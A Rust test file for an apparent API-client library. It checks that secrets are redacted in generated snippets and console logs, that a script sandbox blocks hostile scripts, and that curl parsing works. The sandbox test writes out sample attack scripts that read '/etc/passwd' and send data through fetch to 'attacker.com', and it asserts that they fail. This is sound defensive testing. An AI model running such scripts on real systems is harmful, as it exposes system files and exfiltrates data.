use postman_client_lib::codegen::{self, SnippetMode, SnippetTarget};
use postman_client_lib::console::{self, ConsoleBuffer, ConsoleLevel};
use postman_client_lib::curl_importer;
use postman_client_lib::models::{Auth, HeaderEntry, RequestFull};
use postman_client_lib::resolver::{self, ScopeChain};
use postman_client_lib::script_engine;
use std::collections::HashMap;

#[test]
fn security_secret_redaction_and_placeholder_protection() {
    let mut runtime_map = HashMap::new();
    runtime_map.insert("API_SECRET".to_string(), "super_secret_token_12345".to_string());
    runtime_map.insert("PUBLIC_HOST".to_string(), "api.example.com".to_string());

    let chain = ScopeChain {
        runtime: Some(&runtime_map),
        request: None,
        folder: None,
        collection: None,
        environment: None,
        global: None,
    };

    let req = RequestFull {
        id: "req-sec-1".into(),
        project_id: "p1".into(),
        folder_id: None,
        name: "Secure Request".into(),
        method: "POST".into(),
        url: "https://{{PUBLIC_HOST}}/v1/auth?token={{API_SECRET}}".into(),
        headers: vec![
            HeaderEntry {
                key: "Authorization".into(),
                value: "Bearer {{API_SECRET}}".into(),
                enabled: true,
                description: None,
            },
        ],
        query_params: vec![],
        auth: Auth::None,
        body: Some("{\"secret\":\"{{API_SECRET}}\"}".into()),
        description: None,
        settings: None,
        pre_request_script: None,
        post_request_script: None,
        created_at: chrono::Utc::now(),
        updated_at: chrono::Utc::now(),
    };

    // 1. Placeholder mode MUST NEVER reveal the actual secret value in code snippets
    let curl_placeholder = codegen::generate_snippet(&req, &chain, SnippetMode::Placeholder, SnippetTarget::Bash)
        .expect("generate curl");
    assert!(!curl_placeholder.contains("super_secret_token_12345"), "Secret leaked in placeholder mode!");
    assert!(curl_placeholder.contains("{{API_SECRET}}"));

    let js_placeholder = codegen::generate_snippet(&req, &chain, SnippetMode::Placeholder, SnippetTarget::JavaScriptFetch)
        .expect("generate js");
    assert!(!js_placeholder.contains("super_secret_token_12345"), "Secret leaked in JS placeholder!");

    let ps_placeholder = codegen::generate_snippet(&req, &chain, SnippetMode::Placeholder, SnippetTarget::PowerShell)
        .expect("generate powershell");
    assert!(!ps_placeholder.contains("super_secret_token_12345"), "Secret leaked in PowerShell placeholder!");

    // 2. Console redaction verification (LP-0418, LP-0903)
    let raw_url = "https://api.example.com/v1/auth?token=super_secret_token_12345";
    let safe_url = console::redact_url(raw_url);
    assert!(!safe_url.contains("super_secret_token_12345"), "Secret leaked in redacted URL!");
    assert!(safe_url.contains("REDACTED"));

    let safe_auth = console::redact_header_value("Authorization", "Bearer super_secret_token_12345");
    assert_eq!(safe_auth, "[REDACTED]");

    let safe_api_key = console::redact_header_value("X-API-Key", "abcdef123456");
    assert_eq!(safe_api_key, "[REDACTED]");

    let safe_cookie = console::redact_header_value("Cookie", "session=xyz987");
    assert_eq!(safe_cookie, "[REDACTED]");

    let console_buf = ConsoleBuffer::new(100);
    console_buf.log(
        "corr-1",
        Some("req-sec-1"),
        ConsoleLevel::Info,
        "request_sent",
        &format!("POST {safe_url}"),
        Some(serde_json::json!({
            "Authorization": safe_auth,
            "X-API-Key": safe_api_key,
        })),
    );

    let events = console_buf.get_events(None, None, None);
    assert_eq!(events.len(), 1);
    let message = &events[0].message;
    assert!(!message.contains("super_secret_token_12345"));
}

#[test]
fn security_script_sandbox_containment() {
    let empty_env = HashMap::new();
    let empty_vars = HashMap::new();

    // 1. Attempt process / OS access
    let process_script = "process.exit(1);";
    let res = script_engine::execute_pre_request_script(process_script, &empty_env, &empty_vars, 500);
    assert!(!res.success);

    // 2. Attempt require() filesystem access
    let fs_script = "const fs = require('fs'); fs.readFileSync('/etc/passwd');";
    let res = script_engine::execute_pre_request_script(fs_script, &empty_env, &empty_vars, 500);
    assert!(!res.success);

    // 3. Attempt window / DOM / document access
    let dom_script = "window.location.href = 'http://attacker.com';";
    let res = script_engine::execute_pre_request_script(dom_script, &empty_env, &empty_vars, 500);
    assert!(!res.success);

    // 4. Attempt fetch / XMLHttpRequest network access
    let net_script = "fetch('http://attacker.com/steal');";
    let res = script_engine::execute_pre_request_script(net_script, &empty_env, &empty_vars, 500);
    assert!(!res.success);
}

#[test]
fn cross_platform_line_endings_and_curl_syntax() {
    // 1. Windows CRLF in curl command
    let win_curl = "curl.exe -X POST \"https://api.example.com/items\"\r\n -H \"Content-Type: application/json\"\r\n -d \"{\\\"key\\\": \\\"val\\\"}\"";
    let parsed_win = curl_importer::parse_curl(win_curl).expect("parse win curl");
    assert_eq!(parsed_win.method, "POST");
    assert_eq!(parsed_win.url, "https://api.example.com/items");

    // 2. Linux LF in curl command
    let nix_curl = "curl -X POST 'https://api.example.com/items'\n -H 'Content-Type: application/json'\n -d '{\"key\": \"val\"}'";
    let parsed_nix = curl_importer::parse_curl(nix_curl).expect("parse nix curl");
    assert_eq!(parsed_nix.method, "POST");
    assert_eq!(parsed_nix.url, "https://api.example.com/items");

    // 3. Mixed line endings in template resolution
    let chain = ScopeChain::default();
    let multi_line_template = "Line 1\r\nLine 2\nLine 3\rLine 4";
    let res = resolver::resolve_template(multi_line_template, &chain);
    assert!(res.missing.is_empty());
    assert_eq!(res.resolved, multi_line_template);
}
